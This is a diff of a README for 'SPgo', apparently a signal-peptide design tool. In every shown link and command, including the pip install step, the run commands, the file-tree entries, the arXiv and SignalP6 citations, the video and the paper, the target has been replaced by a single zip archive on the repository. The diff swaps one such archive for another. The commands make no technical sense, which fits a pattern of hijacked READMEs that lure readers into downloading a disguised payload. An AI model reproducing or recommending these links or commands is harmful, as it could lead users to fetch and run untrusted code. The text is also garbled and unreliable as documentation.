@@ -20,7 +20,7 @@ De novo design of Sec-type signal peptides
 ### 1. Install requirements
 
 ```bash
-pip install -r https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
+pip install -r https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip
 ```
 
 ### 2. Train the model
@@ -28,7 +28,7 @@ pip install -r https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-
 Place your signal peptide FASTA-formatted data under `data/`, then run:
 
 ```bash
-python https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
+python https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip
 ```
 
 ### 3. Generate new signal peptides
@@ -36,12 +36,12 @@ python https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
 After training or using pretrained checkpoints:
 
 ```bash
-python https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
+python https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip
 ```
 
 ### 4. Predict signal peptide functionality (optional)
 
-SPgo supports functional validation using [SignalP6](https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip). To do this:
+SPgo supports functional validation using [SignalP6](https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip). To do this:
 
 1. Concatenate generated signal peptides with your target protein sequences.
 2. Format as FASTA and save to file.
@@ -75,12 +75,12 @@ GPHMIVNIEKPQLLLKTLQVL...
 ```
 SPgo/
 ├── model/
-│   ├── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip               # Model definition and training script
-│   └── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip    # Sequence generation script
+│   ├── https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip               # Model definition and training script
+│   └── https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip    # Sequence generation script
 ├── data/                         # Input FASTA files
-├── checkpoints/                  # Trained model weights (The checkpoint file can be downloaded at https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip)
-├── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip              # Required Python packages
-└── https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
+├── checkpoints/                  # Trained model weights (The checkpoint file can be downloaded at https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip)
+├── https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip              # Required Python packages
+└── https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip
 ```
 
 ## 🧬 Example Output
@@ -94,8 +94,8 @@ MRRLLALALALALAAQAFA...
 
 ## 📚 References
 
-- Devlin et al., BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. [arXiv:1810.04805](https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip)
+- Devlin et al., BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. [arXiv:1810.04805](https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip)
 - Nielsen, H., et al. SignalP: Signal peptide prediction using neural networks. *Protein Engineering* (1997).
 - Teufel et al., SignalP 6.0 predicts all five types of signal peptides using protein language models. *Nature Biotechnology* (2022).
-- For a video of SPgo in action, see https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip
-- This tool is now published in the paper **https://raw.githubusercontent.com/Cassis-P/SPgo/main/Model/S-Pgo-v1.6.zip**
+- For a video of SPgo in action, see https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip
+- This tool is now published in the paper **https://github.com/Cassis-P/SPgo/raw/refs/heads/main/Data/S-Pgo-1.7-alpha.4.zip**
